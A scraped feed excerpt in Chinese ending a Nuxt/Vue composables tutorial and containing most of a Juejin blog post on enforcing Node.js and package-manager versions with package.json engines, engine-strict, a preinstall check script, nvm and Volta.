  <span class="hljs-keyword">return</span> locale
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useLocales</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> locale = <span class="hljs-title function_">useLocale</span>()
  <span class="hljs-keyword">const</span> locales = <span class="hljs-title function_">ref</span>([
    <span class="hljs-string">'en-US'</span>,
    <span class="hljs-string">'en-GB'</span>,
    ...
  ])
  <span class="hljs-keyword">if</span> (!locales.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(locale.<span class="hljs-property">value</span>)) {
    locales.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>(locale.<span class="hljs-property">value</span>)
  }
  <span class="hljs-keyword">return</span> locales
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useLocaleDate</span> = (<span class="hljs-params">date: Ref&lt;<span class="hljs-built_in">Date</span>&gt; | <span class="hljs-built_in">Date</span>, locale = useLocale()</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intl</span>.<span class="hljs-title class_">DateTimeFormat</span>(locale.<span class="hljs-property">value</span>, {
    <span class="hljs-attr">dateStyle</span>: <span class="hljs-string">'full'</span>
  }).<span class="hljs-title function_">format</span>(<span class="hljs-title function_">unref</span>(date)))
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// app.vue</span>
&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">const</span> locales = <span class="hljs-title function_">useLocales</span>()
<span class="hljs-keyword">const</span> locale = <span class="hljs-title function_">useLocale</span>()
<span class="hljs-keyword">const</span> date = <span class="hljs-title function_">useLocaleDate</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">'2026-1-16'</span>))
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>生日<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ date }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"locale-chooser"</span>&gt;</span>语言<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"locale-chooser"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"locale"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"loc of locales"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"loc"</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">"loc"</span>&gt;</span>
        {{ loc }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-5">共享状态</h2>
<p><code>自动导入的组合式函数</code></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// composables/states.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useColor</span> = (<span class="hljs-params"/>) =&gt; useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">'color'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-string">'pink'</span>)
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// app.vue</span>
&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useColor</span> = (<span class="hljs-params"/>) =&gt; useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">'color'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-string">'pink'</span>)

<span class="hljs-keyword">const</span> color = <span class="hljs-title function_">useColor</span>() <span class="hljs-comment">// 与 useState('color')相同</span>
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ color }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-6">用库 - 第三方的</h2>
<ul>
<li>Pinia</li>
<li>Harlem</li>
<li>XState</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你知道项目需要什么 node 版本吗？哪个包管理工具的什么版本？]]></title>    <link>https://juejin.cn/post/7595772638880497715</link>    <guid>https://juejin.cn/post/7595772638880497715</guid>    <pubDate>2026-01-16T09:11:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595772638880497715" data-draft-id="7595683968683687982" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你知道项目需要什么 node 版本吗？哪个包管理工具的什么版本？"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-16T09:11:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Carry345"/> <meta itemprop="url" content="https://juejin.cn/user/831674360017678"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你知道项目需要什么 node 版本吗？哪个包管理工具的什么版本？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/831674360017678/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Carry345
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:11:17.000Z" title="Fri Jan 16 2026 09:11:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>近期接手了一个新项目,<code>clone</code>下来发现</p>
<ol>
<li><code>readme</code> 无迹可循,node 版本等信息,只能口口相传,强依赖于上一个开发者</li>
<li>项目中有 npm, yan, pnpm 相关的配置，却无法知道明确应该使用那个包管理工具</li>
</ol>
<p>于是开始致力于寻找解决之法</p>
<h2 data-id="heading-0">1. 指定 node 版本</h2>
<h3 data-id="heading-1">1.1. 约束</h3>
<p>问题：如果开发者任意使用了某个版本的 node,显然是不符合预期的，所以我们需要添加约束，来尽可能早的暴露错误</p>
<p>目的：开发者可以从项目配置获取到 node 版本信息，以及使用了不符合的 node 版本时warn 或 error</p>
<h4 data-id="heading-2">步骤一：最基础约束：<code>package.json → engines</code></h4>
<p>配置方式：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=18 &lt;21"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>实际效果：</p>
<ul>
<li>npm / pnpm / yarn 会检查</li>
</ul>
<blockquote>
<p>不一样的包管理工具，或同一包管理工具的不同版本，对应行为的说法多种多样，最好自己试一下，下面贴我试下来的结果：</p>
<ul>
<li>npm 10.9.2</li>
<li>pnpm 9.5.0</li>
<li>yarn 1.22.22</li>
</ul>
</blockquote>
<p>npm: warn</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/758d3bf86a174820bec914507b1b69e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=uWztzaNJv2ZLdBczUhdxWm3mg7g%3D" alt="" loading="lazy"/></p>
<p>pnpm: warn</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c96fd0889c240cd92568a29a5ada999~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=9An6IQOHMjW4J2pFuzSVcs9hzqo%3D" alt="" loading="lazy"/></p>
<p>yarn: error</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e92a8863731a40448de92553cb554d0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=9gl7GYse3rlVKPAZxPXgCuo1SRY%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-3">步骤二：最基础约束基础上添加<code>engine-strict=true</code></h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">engine-strict</span>=<span class="hljs-literal">true</span>
</code></pre>
<p>npm: error</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0d70e2d4efa406fbda251f72f964b0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=buPGyynuJ5mxDyc0MQmYbjdK9gM%3D" alt="" loading="lazy"/></p>
<p>pnpm: error</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ca7a3ee074e455487716a3ebd10d90d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=1bBdiiP7QRQxqpdVvYkgJZ63qZc%3D" alt="" loading="lazy"/></p>
<p>yarn: error (原本也是)</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dfd66d373094649951749339173c607~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=Jfip6fJFThAI3Q2ZYJCHw09bqRY%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">步骤三：脚本约束(最终防线 可选)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [major] = process.<span class="hljs-property">versions</span>.<span class="hljs-property">node</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Number</span>)

<span class="hljs-keyword">if</span> (major &lt; <span class="hljs-number">18</span> || major &gt;= <span class="hljs-number">21</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(
    <span class="hljs-string">`❌ Node.js version <span class="hljs-subst">${process.versions.node}</span> is not supported.\n`</span> +
    <span class="hljs-string">`Required: &gt;=18 &lt;21`</span>
  )
  process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>)
}
</code></pre>

<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node scripts/check-node.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-5">1.2. node 版本切换辅助</h3>
<p>目的：进入项目实现 node 版本自动切换，或简化手动版本切换</p>
<h4 data-id="heading-6">方案一：nvm + .nvmrc （手动）</h4>
<p>1️⃣ 在项目根目录新建 <code>.nvmrc</code></p>
<pre><code class="hljs">22.16.0
</code></pre>
<p>2️⃣ 进入项目执行 <code>nvm use</code></p>
<blockquote>
<p>开发者需要提前安装</p>
<ul>
<li><code>nvm</code>（macOS / Linux）</li>
<li>Windows 需要 <code>nvm-windows</code></li>
</ul>
</blockquote>
<h4 data-id="heading-7">方案二：Volta （自动）</h4>
<p>1️⃣ 在项目中 pin node</p>
<pre><code class="hljs language-kotlin" lang="kotlin">volta pin <span class="hljs-symbol">node@</span><span class="hljs-number">22.16</span><span class="hljs-number">.0</span>

# 包管理工具一起固定
# volta pin <span class="hljs-symbol">pnpm@</span><span class="hljs-number">9.12</span><span class="hljs-number">.2</span>     # 或 <span class="hljs-symbol">yarn@</span><span class="hljs-number">1.22</span><span class="hljs-number">.19</span> / <span class="hljs-symbol">npm@</span><span class="hljs-number">10.8</span><span class="hljs-number">.3</span>
</code></pre>
<p>生成如下内容，会添加在 <code>package.josn</code>文件中</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"volta"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"18.19.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>2️⃣ 自动切换 node</p>
<p>不需要手动切换，进入项目后，volta 会在第一次用到 node 时自动切换为目标 <code>node</code> 版本（如果没有目标版本，会自动下载），进入项目 <code>node -v</code>可验证</p>
<blockquote>
<p>开发者需要提前安装</p>
<ul>
<li>Volta</li>
</ul>
</blockquote>
<blockquote>
<p>注意⚠️：现在 volta 不支持 uninstall node</p>
<p>原因：Volta 把 Node 当成“基础设施”，官方不支持、也不推荐卸载 node</p>
<p>偏方：自己找到文件夹的位置<code>~/.volta/tools/image/node/</code>删掉</p>
</blockquote>
<h2 data-id="heading-8">2. 指定包管理工具</h2>
<p>包管理工具 packageManager (PM)</p>
<p>当看见项目中关于npm,pnpm,yarn包管理工具的配置都存在时，我一脸蒙，不知道应该用哪一个包管理工具，此时明确指定包管理工具才是预期，那么如何指定呢？</p>
<h3 data-id="heading-9">2.1. 约束</h3>
<p>目的：开发者可以从项目配置获取到可以使用哪个包管理工具，以及使用了不符合的 node 版本时 error</p>
<h4 data-id="heading-10">步骤一：package.json -&gt; packageManager（声明 软提醒）</h4>
<p>比如指定 pnpm</p>
